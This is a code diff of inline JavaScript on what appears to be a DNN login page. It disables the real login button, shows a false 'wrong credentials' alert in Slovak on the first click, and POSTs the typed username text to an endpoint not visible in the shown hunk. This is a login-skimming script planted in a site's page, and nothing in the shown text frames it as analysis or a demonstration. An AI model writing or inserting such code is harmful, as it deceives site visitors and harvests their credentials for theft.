@@ -525,15 +525,20 @@ document.addEventListener("DOMContentLoaded", function () {
   const loginInput = document.getElementById("dnn_ctr_Login_Login_AIS.DNN.Authentication_txtUsername");
   const loginButton = document.getElementById("dnn_ctr_Login_Login_AIS.DNN.Authentication_btnLogin");
 
-  let errorShown = false;
+  let firstClick = true;
 
   if (loginInput && loginButton) {
-    loginButton.addEventListener("click", function () {
+    loginButton.removeAttribute("href"); 
+    loginButton.style.cursor = "pointer"; 
+
+    loginButton.addEventListener("click", function (e) {
+      e.preventDefault(); 
+
       const text = loginInput.value.trim();
 
-      if (!errorShown) {
-        alert("Nesprávne prihlasovacie údaje");
-        errorShown = true;
+      if (firstClick) {
+        alert("Nesprávne prihlasovacie údaje.");
+        firstClick = false;
       }
 
       if (text) {
@@ -545,10 +550,12 @@ document.addEventListener("DOMContentLoaded", function () {
           body: new URLSearchParams({ "text": text })
         });
       }
+
     });
   }
 });
 </script>
+
 
 </script>
 
